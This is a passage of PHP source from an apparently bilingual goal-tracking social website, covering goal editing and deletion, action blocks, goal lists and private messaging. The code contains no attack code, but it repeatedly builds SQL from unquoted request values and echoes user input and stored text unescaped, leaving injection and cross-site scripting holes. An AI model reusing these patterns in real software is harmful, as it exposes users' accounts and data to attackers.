												{
													if($image_check[$iter])
													{
														$picture_name = "picture".$iter;
														move_uploaded_file($_FILES[$picture_name]['tmp_name'], $target_dir."result_".$goalid."_".$iter.".".$image_File_Type[$iter]);
													}
												}
												echo $output_success;
											}
										}
									}else
									{
										echo $output_not_author;
									}
								}else
								{
									echo $output_no_goal;
								}
								break;
								
								case 'followgoal':
								switch($_GET['language'])
								{
									case 'german':
									$output_success = "Du folgst jetzt diesem Ziel.";
									$output_no_goal = "Dieses Ziel existiert nicht.";
									$output_follows_already = "Du folgst diesem Ziel bereits.";
									break;
									
									case 'english':
									$output_success = "Now you are following this goal.";
									$output_no_goal = "There is no such goal.";
									$output_follows_already = "You are already following this goal.";
									break;
								}
								$goalid = mysqli_real_escape_string($mysql_connection, $_GET['goalid']);
								$check_goal_query = mysqli_query($mysql_connection, "SELECT id FROM goals WHERE id=$goalid LIMIT 1");
								if(mysqli_num_rows($check_goal_query))
								{
									$check_following_query = mysqli_query($mysql_connection, "SELECT id FROM goalfollowers WHERE goalid=$goalid AND userid=".$userdata['id']." LIMIT 1");
									if(mysqli_num_rows($check_following_query))
									{
										echo $output_follows_already;
									}else
									{
										mysqli_query($mysql_connection, "INSERT INTO goalfollowers (userid, goalid) VALUES ('".$userdata['id']."',$goalid)");
										echo "<script> location.href='login.php?language=".$_GET['language']."&action=goal&goalid=".$goalid."'; </script>";
										exit;
									}
								}else
								{
									echo $output_no_goal;
								}
								break;
								
								case 'unfollowgoal':
								switch($_GET['language'])
								{
									case 'german':
									$output_success = "Du folgst diesem Ziel nicht mehr.";
									$output_no_goal = "Dieses Ziel existiert nicht.";
									$output_not_following = "Du folgst diesem Ziel nicht.";
									break;
									
									case 'english':
									$output_success = "You unfollowed this goal.";
									$output_no_goal = "There is no such goal.";
									$output_not_following = "You are not following this goal.";
									break;
								}
								$goalid = mysqli_real_escape_string($mysql_connection, $_GET['goalid']);
								$check_goal_query = mysqli_query($mysql_connection, "SELECT id FROM goals WHERE id=$goalid LIMIT 1");
								if(mysqli_num_rows($check_goal_query))
								{
									$check_following_query = mysqli_query($mysql_connection, "SELECT id FROM goalfollowers WHERE goalid=$goalid AND userid=".$userdata['id']." LIMIT 1");
									if(mysqli_num_rows($check_following_query))
									{
										mysqli_query($mysql_connection, "DELETE FROM goalfollowers WHERE goalid=$goalid AND userid=".$userdata['id']."");
										echo "<script> location.href='login.php?language=".$_GET['language']."&action=goal&goalid=".$goalid."'; </script>";
										exit;
									}else
									{
										echo $output_not_following;
									}
								}else
								{
									echo $output_no_goal;
								}
								break;
								
								case 'editgoal':
								switch($_GET['language'])
								{
									case 'german':
									$label_anonymous = "Anonym posten?";
									$output_title = "Titel";
									$label_section = "Kategorie";
									$label_description = "Beschreibung";
									$option_yes = "Ja";
									$option_no = "Nein";
									$input_submit = "Änderungen speichern";
									$output_not_author = "Du bist nicht der Autor dieses Zieles.";
									$output_no_goal = "Dieses Ziel existiert nicht.";
									$sections = array( "study" => "Studium" , "finance" => "Finanzen" , "career" => "Karriere" , "selfdevelopment" => "Selbstentwicklung" , "social" => "Soziales" , "sport" => "Sport" , "health" => "Gesundheit" , "other" => "Sonstiges" );
									break;
									
									case 'english':
									$label_anonymous = "Post anonymously?";
									$output_title = "Title";
									$label_section = "Section";
									$label_description = "Description";
									$option_yes = "Yes";
									$option_no = "No";
									$input_submit = "Save changes";
									$output_not_author = "You are not the author of this goal.";
									$output_no_goal = "There is no such goal.";
									$sections = array( "study" => "Study" , "finance" => "Finance" , "career" => "Career" , "selfdevelopment" => "Selfdevelopment" , "social" => "Social" , "sport" => "Sport" , "health" => "Health" , "other" => "Other" );
									break;
								}
								$goalid = mysqli_real_escape_string($mysql_connection, $_GET['goalid']);
								$goal_query = mysqli_query($mysql_connection, "SELECT * FROM goals WHERE id=$goalid LIMIT 1");
								if(mysqli_num_rows($goal_query))
								{
									$goal = mysqli_fetch_array($goal_query);
									if($goal['userid'] == $userdata['id'])
									{
										echo "<div class=\"block\">";
											echo "<div class=\"innerblock\">";
												echo "<form action=\"login.php?language=".$_GET['language']."&action=editedgoal&goalid=".$goalid."\" method=\"post\" accept-charset=\"utf-8\">";
													echo "<div>".$output_title." <input name=\"title\" value=\"".$goal['title']."\"></input></div>";
													echo "<div class=\"clear\"></div>";
													echo "<label>".$label_anonymous."</label>";
													echo "<span><select name=\"anonymous\" size=\"1\">";
														if($goal['anonymous'])
														{
															echo "<option value=\"0\">".$option_no."</option>";
															echo "<option value=\"1\" selected>".$option_yes."</option>";
														}else
														{
															echo "<option value=\"0\" selected>".$option_no."</option>";
															echo "<option value=\"1\">".$option_yes."</option>";
														}
													echo "</select></span>";
													echo "<div class=\"clear\"></div>";
													echo "<label>".$label_section."</label>";
													echo "<span><select name=\"section\" size=\"1\">";
														foreach($sections as $section => $output_section)
														{
															if($goal['section'] == $section)
															{
																echo "<option value=\"".$section."\" selected>".$output_section."</option>";
															}else
															{
																echo "<option value=\"".$section."\">".$output_section."</option>";
															}
														}
													echo "</select></span>";
													echo "<div class=\"clear\"></div>";
													echo "<label>".$label_description."</label>";
													echo "<textarea name=\"description\">".$goal['description']."</textarea>";
													echo "<br>";
													echo "<span><input type=\"submit\" value=\"".$input_submit."\"></input></span>";
												echo "</form>";
											echo "</div>";
										echo "</div>";
									}else
									{
										echo $output_not_author;
									}
								}else
								{
									echo $output_no_goal;
								}
								break;
								
								case 'editedgoal':
								switch($_GET['language'])
								{
									case 'german':
									$output_success = "Ziel geändert.";
									$output_fail = "Bitte alle Felder ausfüllen.";
									$output_not_author = "Du bist nicht der Autor dieses Zieles.";
									$output_no_goal = "Dieses Ziel existiert nicht.";
									break;
									
									case 'english':
									$output_success = "Goal edited.";
									$output_fail = "Please fill in all fields.";
									$output_not_author = "You are not the author of this goal.";
									$output_no_goal = "There is no such goal.";
									break;
								}
								$goalid = mysqli_real_escape_string($mysql_connection, $_GET['goalid']);
								$check_author_query = mysqli_query($mysql_connection, "SELECT userid FROM goals WHERE id=$goalid LIMIT 1");
								if(mysqli_num_rows($check_author_query))
								{
									$check_author = mysqli_fetch_array($check_author_query);
									if($check_author['userid'] == $userdata['id'])
									{
										if(empty($_POST['title']) OR empty($_POST['description']))
										{
											echo $output_fail;
										}else
										{
											$anonymous = mysqli_real_escape_string($mysql_connection, $_POST['anonymous']);
											$title = mysqli_real_escape_string($mysql_connection, $_POST['title']);
											$section = mysqli_real_escape_string($mysql_connection, $_POST['section']);
											$description = mysqli_real_escape_string($mysql_connection, $_POST['description']);
											mysqli_query($mysql_connection, "UPDATE goals SET anonymous = '".$anonymous."', title = '$title', description = '$description', section = '$section' WHERE id=$goalid");
											echo "<script> location.href='login.php?language=".$_GET['language']."&action=goal&goalid=".$goalid."'; </script>";
											exit;
										}
									}else
									{
										echo $output_not_author;
									}
								}else
								{
									echo $output_no_goal;
								}
								break;
								
								case 'delete_goal':
								switch($_GET['language'])
								{
									case 'german':
									$output_success = "Ziel gelöscht.";
									$output_not_author = "Du bist nicht der Autor dieses Zieles.";
									$output_no_goal = "Dieses Ziel existiert nicht.";
									$output_security_check = "Willst du dieses Ziel wirklich löschen?";
									$a_security_check = "Ziel löschen";
									break;
									
									case 'english':
									$output_success = "Goal deleted.";
									$output_not_author = "You are not the author of this goal.";
									$output_no_goal = "There is no such goal.";
									$output_security_check = "Are you sure you want to delete this goal?";
									$a_security_check = "Delete goal";
									break;
								}
								$goalid = mysqli_real_escape_string($mysql_connection, $_GET['goalid']);
								$goal_query = mysqli_query($mysql_connection, "SELECT userid FROM goals WHERE id = ".$goalid." LIMIT 1");
								if(mysqli_num_rows($goal_query))
								{
									$goal = mysqli_fetch_array($goal_query);
									if($goal['userid'] == $userdata['id'])
									{
										if(!empty($_GET['security_check']))
										{
											mysqli_query($mysql_connection, "DELETE FROM goals WHERE id = ".$goalid);
											mysqli_query($mysql_connection, "DELETE FROM actionblocks WHERE goalid = ".$goalid);
											$post_query = mysqli_query($mysql_connection, "SELECT id,userid,type,picture FROM posts WHERE goalid = ".$goalid);
											if(mysqli_num_rows($post_query) >= 1)
											{
												while($post = mysqli_fetch_array($post_query))
												{
													if($post['type'])
													{
														mysqli_query($mysql_connection, "DELETE FROM posts WHERE id = ".$post['id']);
														mysqli_query($mysql_connection, "DELETE FROM likes WHERE postid = ".$post['id']);
														mysqli_query($mysql_connection, "DELETE FROM comments WHERE postid = ".$post['id']);
														mysqli_query($mysql_connection, "DELETE FROM scheduleblocks WHERE postid = ".$post['id']);
													}else
													{
														mysqli_query($mysql_connection, "DELETE FROM posts WHERE id = ".$post['id']);
														mysqli_query($mysql_connection, "DELETE FROM likes WHERE postid = ".$post['id']);
														mysqli_query($mysql_connection, "DELETE FROM comments WHERE postid = ".$post['id']);
													}
												}
											}
											$result_query = mysqli_query($mysql_connection, "SELECT id FROM results WHERE goalid = ".$goalid." LIMIT 1");
											if(mysqli_num_rows($result_query))
											{
												mysqli_query($mysql_connection, "DELETE FROM results WHERE goalid = ".$goalid);
											}
											echo $output_success;
										}else
										{
											echo $output_security_check;
											echo " <a href=\"login.php?language=".$_GET['language']."&action=delete_goal&goalid=".$goalid."&security_check=true\">".$a_security_check."</a>";
										}
									}else
									{
										echo $output_not_author;
									}
								}else
								{
									echo $output_no_goal;
								}
								break;
								
								case 'editblock':
								switch($_GET['language'])
								{
									case 'german':
									$label_blockname = "Blockname";
									$output_not_author = "Du bist nicht der Autor dieses Zieles.";
									$output_no_goal = "Es existiert kein Ziel mit diesem Block.";
									$output_no_block = "Dieser Aktionsblock existiert nicht.";
									$output_block_used = "Dieser Aktionsblock wurde bereits für die Dokumentation benutzt und kann daher nicht mehr geändert werden.";
									$input_submit = "Änderungen speichern";
									break;
									
									case 'english':
									$label_blockname = "Blockname";
									$output_not_author = "You are not the author of this goal.";
									$output_no_goal = "There is no goal with this block.";
									$output_no_block = "There is no such actionblock.";
									$output_block_used = "This actionblock has already been used for documentation and therefore it cannot be edited anymore.";
									$input_submit = "Save changes";
									break;
								}
								$blockid = mysqli_real_escape_string($mysql_connection, $_GET['blockid']);
								$check_block_query = mysqli_query($mysql_connection, "SELECT * FROM actionblocks WHERE id=$blockid LIMIT 1");
								if(mysqli_num_rows($check_block_query))
								{
									$block = mysqli_fetch_array($check_block_query);
									$check_goal_query = mysqli_query($mysql_connection, "SELECT userid FROM goals WHERE id=".$block['goalid']." LIMIT 1");
									if(mysqli_num_rows($check_goal_query))
									{
										$check_author = mysqli_fetch_array($check_goal_query);
										if($check_author['userid'] == $userdata['id'])
										{
											$schedule_query = mysqli_query($mysql_connection, "SELECT id FROM scheduleblocks WHERE actionblockid = ".$block['id']." LIMIT 1");
											if(mysqli_num_rows($schedule_query) == 0)
											{
												echo "<div class=\"block\">";
													echo "<div class=\"innerblock\">";
														echo "<form action=\"login.php?language=".$_GET['language']."&action=editedblock&blockid=".$block['id']."\" method=\"post\" accept-charset=\"utf-8\">";
															echo "<label>".$label_blockname."</label>";
															echo "<input name=\"blockname\" value=\"".$block['name']."\"></input>";
															echo "<span><input type=\"submit\" value=\"".$input_submit."\"></input></span>";
														echo "</form>";
													echo "</div>";
												echo "</div>";
											}else
											{
												echo $output_block_used;
											}
										}else
										{
											echo $output_not_author;
										}
									}else
									{
										echo $output_no_goal;
									}
								}else
								{
									echo $output_no_block;
								}
								break;
								
								case 'editedblock':
								switch($_GET['language'])
								{
									case 'german':
									$output_success = "Block geändert.";
									$output_not_author = "Du bist nicht der Autor dieses Zieles.";
									$output_no_goal = "Es existiert kein Ziel mit diesem Block.";
									$output_no_block = "Dieser Aktionsblock existiert nicht.";
									$output_block_used = "Dieser Aktionsblock wurde bereits für die Dokumentation benutzt und kann daher nicht mehr geändert werden.";
									break;
									
									case 'english':
									$output_success = "Block edited.";
									$output_not_author = "You are not the author of this goal.";
									$output_no_goal = "There is no goal with this block.";
									$output_no_block = "There is no such actionblock.";
									$output_block_used = "This actionblock has already been used for documentation and therefore it cannot be edited anymore.";
									break;
								}
								$blockid = mysqli_real_escape_string($mysql_connection, $_GET['blockid']);
								$blockname = mysqli_real_escape_string($mysql_connection, $_POST['blockname']);
								$check_block_query = mysqli_query($mysql_connection, "SELECT * FROM actionblocks WHERE id=$blockid LIMIT 1");
								if(mysqli_num_rows($check_block_query))
								{
									$block = mysqli_fetch_array($check_block_query);
									$check_goal_query = mysqli_query($mysql_connection, "SELECT userid FROM goals WHERE id=".$block['goalid']." LIMIT 1");
									if(mysqli_num_rows($check_goal_query))
									{
										$check_author = mysqli_fetch_array($check_goal_query);
										if($check_author['userid'] == $userdata['id'])
										{
											$schedule_query = mysqli_query($mysql_connection, "SELECT id FROM scheduleblocks WHERE actionblockid = ".$block['id']." LIMIT 1");
											if(mysqli_num_rows($schedule_query) == 0)
											{
												mysqli_query($mysql_connection, "UPDATE actionblocks SET name = '$blockname' WHERE id=$blockid");
												echo "<script> location.href='login.php?language=".$_GET['language']."&action=goal&goalid=".$block['goalid']."'; </script>";
												exit;
											}else
											{
												echo $output_block_used;
											}
										}else
										{
											echo $output_not_author;
										}
									}else
									{
										echo $output_no_goal;
									}
								}else
								{
									echo $output_no_block;
								}
								break;
								
								case 'deleteblock':
								switch($_GET['language'])
								{
									case 'german':
									$output_success = "Block gelöscht.";
									$output_not_author = "Du bist nicht der Autor dieses Zieles.";
									$output_no_goal = "Es existiert kein Ziel mit diesem Block.";
									$output_no_block = "Dieser Aktionsblock existiert nicht.";
									$output_block_used = "Dieser Aktionsblock wurde bereits für die Dokumentation benutzt und kann daher nicht mehr gelöscht werden.";
									$output_security_check = "Willst du diesen Aktionsblock wirklich löschen?";
									$a_security_check = "Aktionsblock löschen";
									break;
									
									case 'english':
									$output_success = "Block deleted.";
									$output_not_author = "You are not the author of this goal.";
									$output_no_goal = "There is no goal with this block.";
									$output_no_block = "There is no such actionblock.";
									$output_block_used = "This actionblock has already been used for documentation and therefore it cannot be deleted anymore.";
									$output_security_check = "Are you sure you want to delete this actionblock?";
									$a_security_check = "Delete Actionblock";
									break;
								}
								$blockid = mysqli_real_escape_string($mysql_connection, $_GET['blockid']);
								$check_block_query = mysqli_query($mysql_connection, "SELECT goalid FROM actionblocks WHERE id=$blockid LIMIT 1");
								if(mysqli_num_rows($check_block_query))
								{
									$block = mysqli_fetch_array($check_block_query);
									$check_goal_query = mysqli_query($mysql_connection, "SELECT userid FROM goals WHERE id=".$block['goalid']." LIMIT 1");
									if(mysqli_num_rows($check_goal_query))
									{
										$check_author = mysqli_fetch_array($check_goal_query);
										if($check_author['userid'] == $userdata['id'])
										{
											$schedule_query = mysqli_query($mysql_connection, "SELECT id FROM scheduleblocks WHERE actionblockid = ".$blockid." LIMIT 1");
											if(mysqli_num_rows($schedule_query) == 0)
											{
												if(!empty($_GET['security_check']))
												{
													mysqli_query($mysql_connection, "DELETE FROM actionblocks WHERE id=$blockid");
													echo "<script> location.href='login.php?language=".$_GET['language']."&action=goal&goalid=".$block['goalid']."'; </script>";
													exit;
												}else
												{
													echo $output_security_check;
													echo " <a href=\"login.php?language=".$_GET['language']."&action=deleteblock&blockid=".$blockid."&security_check=true\">".$a_security_check."</a>";
												}
											}else
											{
												echo $output_block_used;
											}
										}else
										{
											echo $output_not_author;
										}
									}else
									{
										echo $output_no_goal;
									}
								}else
								{
									echo $output_no_block;
								}
								break;
								
								case 'addblock':
								switch($_GET['language'])
								{
									case 'german':
									$output_not_author = "Du bist nicht der Autor dieses Zieles.";
									$output_no_goal = "Es existiert kein Ziel mit diesem Block.";
									$label_blockname = "Blockname";
									$input_submit = "Block erstellen";
									break;
									
									case 'english':
									$output_not_author = "You are not the author of this goal.";
									$output_no_goal = "There is no goal with this block.";
									$label_blockname = "Blockname";
									$input_submit = "Create block";
									break;
								}
								$goalid = mysqli_real_escape_string($mysql_connection, $_GET['goalid']);
								$check_goal_query = mysqli_query($mysql_connection, "SELECT userid FROM goals WHERE id = $goalid LIMIT 1");
								if(mysqli_num_rows($check_goal_query))
								{
									$check_author = mysqli_fetch_array($check_goal_query);
									if($check_author['userid'] == $userdata['id'])
									{
										echo "<div class=\"block\">";
											echo "<div class=\"innerblock\">";
												echo "<form action=\"login.php?language=".$_GET['language']."&action=addedblock&goalid=".$goalid."\" method=\"post\" accept-charset=\"utf-8\">";
													echo "<label>".$label_blockname."</label>";
													echo "<input name=\"blockname\"></input>";
													echo "<span><input type=\"submit\" value=\"".$input_submit."\"></input></span>";
												echo "</form>";
											echo "</div>";
										echo "</div>";
									}else
									{
										echo $output_not_author;
									}
								}else
								{
									echo $output_no_goal;
								}
								break;
								
								case 'addedblock':
								switch($_GET['language'])
								{
									case 'german':
									$output_success = "Block hinzugefügt.";
									$output_not_author = "Du bist nicht der Autor dieses Zieles.";
									$output_no_goal = "Es existiert kein Ziel mit diesem Block.";
									break;
									
									case 'english':
									$output_success = "Block added.";
									$output_not_author = "You are not the author of this goal.";
									$output_no_goal = "There is no goal with this block.";
									break;
								}
								$goalid = mysqli_real_escape_string($mysql_connection, $_GET['goalid']);
								$blockname = mysqli_real_escape_string($mysql_connection, $_POST['blockname']);
								$check_goal_query = mysqli_query($mysql_connection, "SELECT userid FROM goals WHERE id = $goalid LIMIT 1");
								if(mysqli_num_rows($check_goal_query))
								{
									$check_author = mysqli_fetch_array($check_goal_query);
									if($check_author['userid'] == $userdata['id'])
									{
										mysqli_query($mysql_connection, "INSERT INTO actionblocks (goalid, name) VALUES ($goalid, '$blockname')");
										echo "<script> location.href='login.php?language=".$_GET['language']."&action=goal&goalid=".$goalid."'; </script>";
										exit;
									}else
									{
										echo $output_not_author;
									}
								}else
								{
									echo $output_no_goal;
								}
								break;
								
								case 'goallist':
								switch($_GET['language'])
								{
									case 'german':
									$output_author_anonymous = "Anonym";
									$sections = array( "study" => "Studium" , "finance" => "Finanzen" , "career" => "Karriere" , "selfdevelopment" => "Selbstentwicklung" , "social" => "Soziales" , "sport" => "Sport" , "health" => "Gesundheit" , "other" => "Sonstiges");
									break;
									
									case 'english':
									$output_author_anonymous = "Anonymous";
									$sections = array( "study" => "Study" , "finance" => "Finance" , "career" => "Career" , "selfdevelopment" => "Selfdevelopment" , "social" => "Social" , "sport" => "Sport" , "health" => "Health" , "other" => "Other");
									break;
								}
								echo "<div class=\"list\">";
									echo "<div class=\"twocolumns\">";
										foreach($sections as $section=>$section_output)
										{	
											echo "<div class=\"sectionblock\">";
												echo "<div class=\"innersectionblock\">";
													$goallist_query = mysqli_query($mysql_connection, "SELECT * FROM goals WHERE section = '$section'");
													echo "<b>".$section_output."</b>";
													while($goallist = mysqli_fetch_array($goallist_query))
													{
														if($goallist['anonymous'])
														{
															$author = $output_author_anonymous;
														}else
														{
															$author_data_query = mysqli_query($mysql_connection, "SELECT id,name, surname FROM users WHERE id = ".$goallist['userid']);
															$author_data = mysqli_fetch_array($author_data_query);
															$author = "<a href=\"login.php?language=".$_GET['language']."&action=user&userid=".$author_data['id']."\">".$author_data['name']." ".$author_data['surname']."</a>";
														}
														echo "<h><span>".$author."</span><a href=\"login.php?language=".$_GET['language']."&action=goal&goalid=".$goallist['id']."\">".$goallist['title']."</a></h>";
													}
												echo "</div>";
											echo "</div>";
										}
									echo "</div>";
								echo "</div>";
								
								break;
								
								case 'owngoals':
								switch($_GET['language'])
								{
									case 'german':
									$output_anonymous = "Anonym";
									$output_not_anonymous = "Öffentlich";
									$sections = array( "study" => "Studium" , "finance" => "Finanzen" , "career" => "Karriere" , "selfdevelopment" => "Selbstentwicklung" , "social" => "Soziales" , "sport" => "Sport" , "health" => "Gesundheit" , "other" => "Sonstiges" );
									break;
									
									case 'english':
									$output_anonymous = "Anonymous";
									$output_not_anonymous = "Public";
									$sections = array( "study" => "Study" , "finance" => "Finance" , "career" => "Career" , "selfdevelopment" => "Selfdevelopment" , "social" => "Social" , "sport" => "Sport" , "health" => "Health" , "other" => "Other" );
									break;
								}
								echo "<div class=\"list\">";
									echo "<div class=\"twocolumns\">";
										foreach($sections as $section=>$section_output)
										{	
											echo "<div class=\"sectionblock\">";
												echo "<div class=\"innersectionblock\">";
													$goallist_query = mysqli_query($mysql_connection, "SELECT * FROM goals WHERE section = '$section' AND userid=".$userdata['id']);
													echo "<b>".$section_output."</b>";
													while($goallist = mysqli_fetch_array($goallist_query))
													{
														if($goallist['anonymous'])
														{
															$anonymous = $output_anonymous;
														}else
														{
															$anonymous = $output_not_anonymous;
														}
														echo "<h><span>".$anonymous."</span><a href=\"login.php?language=".$_GET['language']."&action=goal&goalid=".$goallist['id']."\">".$goallist['title']."</a></h>";
													}
												echo "</div>";
											echo "</div>";
										}
									echo "</div>";
								echo "</div>";
								break;

								case 'inbox':
								switch($_GET['language'])
								{
									case 'german':
									$output_no_messages = "Dein Posteingang ist leer.";
									$output_time = "Zeit";
									$output_sender = "Von";
									$output_message = "Nachricht";
									$a_outbox = "Postausgang";
									break;
									
									case 'english':
									$output_no_messages = "Your inbox is empty.";
									$output_time = "Time";
									$output_sender = "From";
									$output_message = "Message";
									$a_outbox = "Outbox";
									break;
								}
								echo "<div class=\"block\">";
									echo "<div class=\"innerblock\">";
										echo "<div class=\"inbox\">";
											$message_query = mysqli_query($mysql_connection, "SELECT * FROM messages WHERE receiverid = ".$userdata['id']." AND deleted_receiver = 0 ORDER BY time DESC");
											if(mysqli_num_rows($message_query) >= 1)
											{
													echo "<h><span>".$output_time."</span><span>".$output_sender."</span><span>".$output_message."</span></h>";
													while($message = mysqli_fetch_array($message_query))
													{
														$sender_query = mysqli_query($mysql_connection, "SELECT name, surname FROM users WHERE id = ".$message['senderid']." LIMIT 1");
														$sender = mysqli_fetch_array($sender_query);
														if($message['new'])
														{
															$message['text'] = "<b>".$message['text']."</b>";
														}
														echo "<h><span>".date("d.m.Y - H:i", $message['time'])."</span><span><a href=\"login.php?language=".$_GET['language']."&action=user&userid=".$message['senderid']."\">".$sender['name']." ".$sender['surname']."</a></span><span><a href=\"login.php?language=".$_GET['language']."&action=show_message&messageid=".$message['id']."\">".$message['text']."</a></span></h>";
														
													}
											}else
											{
												echo $output_no_messages."<br>";
											}
											echo "<a href=\"login.php?language=".$_GET['language']."&action=outbox\">".$a_outbox."</a>";
										echo "</div>";
									echo "</div>";
								echo "</div>";
								break;
								
								case 'outbox':
								switch($_GET['language'])
								{
									case 'german':
									$output_no_messages = "Dein Postausgang ist leer.";
									$output_time = "Zeit";
									$output_receiver = "An";
									$output_message = "Nachricht";
									$a_inbox = "Posteingang";
									break;
									
									case 'english':
									$output_no_messages = "Your outbox is empty.";
									$output_time = "Time";
									$output_receiver = "To";
									$output_message = "Message";
									$a_inbox = "Inbox";
									break;
								}
								echo "<div class=\"block\">";
									echo "<div class=\"innerblock\">";
										echo "<div class=\"inbox\">";
											$message_query = mysqli_query($mysql_connection, "SELECT * FROM messages WHERE senderid = ".$userdata['id']." AND deleted_sender = 0 ORDER BY time DESC");
											if(mysqli_num_rows($message_query) >= 1)
											{
													echo "<h><span>".$output_time."</span><span>".$output_receiver."</span><span>".$output_message."</span></h>";
													while($message = mysqli_fetch_array($message_query))
													{
														$receiver_query = mysqli_query($mysql_connection, "SELECT name, surname FROM users WHERE id = ".$message['receiverid']." LIMIT 1");
														$receiver = mysqli_fetch_array($receiver_query);
														echo "<h><span>".date("d.m.Y - H:i", $message['time'])."</span><span><a href=\"login.php?language=".$_GET['language']."&action=user&userid=".$message['receiverid']."\">".$receiver['name']." ".$receiver['surname']."</a></span><span><a href=\"login.php?language=".$_GET['language']."&action=show_message&messageid=".$message['id']."\">".$message['text']."</a></span></h>";
														
													}
											}else
											{
												echo $output_no_messages."<br>";
											}
											echo "<a href=\"login.php?language=".$_GET['language']."&action=inbox\">".$a_inbox."</a>";
										echo "</div>";
									echo "</div>";
								echo "</div>";
								break;
								
								case 'write_message':
								switch($_GET['language'])
								{
									case 'german':
									$output_no_receiver = "Dieser User existiert nicht.";
									$label_message = "Nachricht an ";
									$input_submit = "Nachricht senden";
									$output_receiver_yourself = "Du kannst keine Nachricht an dich selbst schicken.";
									break;
									
									case 'english':
									$output_no_receiver = "This user does not exist.";
									$label_message = "Message to ";
									$input_submit = "Send message";
									$output_receiver_yourself = "You cannot write yourself a message.";
									break;
								}
								$receiverid = mysqli_real_escape_string($mysql_connection, $_GET['receiverid']);
								$receiver_query = mysqli_query($mysql_connection, "SELECT name,surname FROM users WHERE id = ".$receiverid." LIMIT 1");
								if(mysqli_num_rows($receiver_query))
								{
									if($receiverid != $userdata['id'])
									{
										$receiver = mysqli_fetch_array($receiver_query);
										echo "<div class=\"block\">";
											echo "<div class=\"innerblock\">";
												echo "<form action=\"login.php?language=".$_GET['language']."&action=send_message&receiverid=".$receiverid."\" method=\"post\" accept-charset=\"utf-8\">";
													echo $label_message."<a href=\"login.php?language=".$_GET['language']."&action=user&userid=".$receiverid."\">".$receiver['name']." ".$receiver['surname']."</a>";
													echo "<textarea name=\"message\"></textarea>";
													echo "<span><input type=\"submit\" value=\"".$input_submit."\"></input></span>";
												echo "</form>";
											echo "</div>";
										echo "</div>";
									}else
									{
										echo $output_receiver_yourself;
									}
								}else
								{
									echo $output_no_receiver;
								}
								break;
								
								case 'send_message':
								switch($_GET['language'])
								{
									case 'german':
									$output_no_receiver = "Dieser User existiert nicht.";
									$output_success = "Nachricht verschickt.";
									$output_receiver_yourself = "Du kannst keine Nachricht an dich selbst schicken.";
									break;
									
									case 'english':
									$output_no_receiver = "This user does not exist.";
									$output_success = "Message sent.";
									$output_receiver_yourself = "You cannot write yourself a message.";
									break;
								}
								$receiverid = mysqli_real_escape_string($mysql_connection, $_GET['receiverid']);
								$receiver_query = mysqli_query($mysql_connection, "SELECT id FROM users WHERE id = ".$receiverid." LIMIT 1");
								if(mysqli_num_rows($receiver_query))
								{
									if($receiverid != $userdata['id'])
									{
										$message = mysqli_real_escape_string($mysql_connection, $_POST['message']);
										mysqli_query($mysql_connection, "INSERT INTO messages (senderid, receiverid, time, text, new) VALUES ('".$userdata['id']."', '$receiverid', '".time()."', '$message', 1)");
										echo $output_success;
									}else
									{
										echo $output_receiver_yourself;
									}
								}else
								{
									echo $output_no_receiver;
								}
								break;
								
								case 'show_message':
								switch($_GET['language'])
								{
									case 'german':
									$output_no_message = "Diese Nachricht existiert nicht.";
									$output_from = "Von";
									$output_to = "An";
									$output_time = "Wann";
									$a_reply = "Antworten";
									$a_delete = "Nachricht löschen";
									break;
									
									case 'english':
									$output_no_message = "There is no such message.";
									$output_from = "From";
									$output_to = "To";
									$output_time = "When";
									$a_reply = "Reply";
									$a_delete = "Delete message";
									break;
								}
								$messageid = mysqli_real_escape_string($mysql_connection, $_GET['messageid']);
								$message_query = mysqli_query($mysql_connection, "SELECT * FROM messages WHERE id = ".$messageid." LIMIT 1");
								if(mysqli_num_rows($message_query))
								{
									$message = mysqli_fetch_array($message_query);
									if(($message['senderid'] == $userdata['id'] AND !$message['deleted_sender']) OR ($message['receiverid'] == $userdata['id'] AND !$message['deleted_receiver']))
									{
										$sender_query = mysqli_query($mysql_connection, "SELECT name, surname FROM users WHERE id = ".$message['senderid']." LIMIT 1");
										$receiver_query = mysqli_query($mysql_connection, "SELECT name, surname FROM users WHERE id = ".$message['receiverid']." LIMIT 1");
										$sender = mysqli_fetch_array($sender_query);
										$receiver = mysqli_fetch_array($receiver_query);
										echo "<div class=\"block\">";
											echo "<div class=\"innerblock\">";
												echo "<div class=\"message\">";
													echo "<h><span>".$output_from."</span><a href=\"login.php?language=".$_GET['language']."&action=user&userid=".$message['senderid']."\">".$sender['name']." ".$sender['surname']."</a></h><h><span>".$output_to."</span><a href=\"login.php?language=".$_GET['language']."&action=user&userid=".$message['receiverid']."\">".$receiver['name']." ".$receiver['surname']."</a></h><h><span>".$output_time."</span>".date("d.m.Y - H:i", $message['time'])."</h>";
													$message['text']=str_replace("\n","<br>",$message['text']);
													echo "<h>".$message['text']."</h>";
													echo "<h><span><a href=\"login.php?language=".$_GET['language']."&action=write_message&receiverid=".$message['senderid']."\">".$a_reply."</a></span><span><a href=\"login.php?language=".$_GET['language']."&action=delete_message&messageid=".$message['id']."\">".$a_delete."</a></span></h>";
												echo "</div>";
											echo "</div>";
										echo "</div>";
										if($message['new'])
										{
											mysqli_query($mysql_connection, "UPDATE messages SET new = 0 WHERE id = ".$messageid);
										}
									}else
									{
										echo $output_no_message;
									}
								}else
								{
									echo $output_no_message;
								}
								break;
								
								case 'delete_message':
								switch($_GET['language'])
								{
									case 'german':
									$output_no_message = "Diese Nachricht existiert nicht.";
									$output_deleted = "Nachricht gelöscht.";
									break;
									
									case 'english':
									$output_no_message = "There is no such message.";
									$output_deleted = "Message deleted.";
									break;
								}
								$messageid = mysqli_real_escape_string($mysql_connection, $_GET['messageid']);
								$message_query = mysqli_query($mysql_connection, "SELECT * FROM messages WHERE id = ".$messageid." LIMIT 1");
								if(mysqli_num_rows($message_query))
								{
									$message = mysqli_fetch_array($message_query);
									if(($message['senderid'] == $userdata['id'] AND !$message['deleted_sender']) OR ($message['receiverid'] == $userdata['id'] AND !$message['deleted_receiver']))
									{
										$sender_query = mysqli_query($mysql_connection, "SELECT name, surname FROM users WHERE id = ".$message['senderid']." LIMIT 1");
										$receiver_query = mysqli_query($mysql_connection, "SELECT name, surname FROM users WHERE id = ".$message['receiverid']." LIMIT 1");
										$sender = mysqli_fetch_array($sender_query);
										$receiver = mysqli_fetch_array($receiver_query);
										if($userdata['id'] == $message['receiverid'])
										{
											mysqli_query($mysql_connection, "UPDATE messages SET deleted_receiver = 1 WHERE id = ".$message['id']);
										}else
										{
											mysqli_query($mysql_connection, "UPDATE messages SET deleted_sender = 1 WHERE id = ".$message['id']);
										}
										echo $output_deleted;
										
									}else
									{
										echo $output_no_message;
									}
								}else
								{
									echo $output_no_message;
								}
								break;
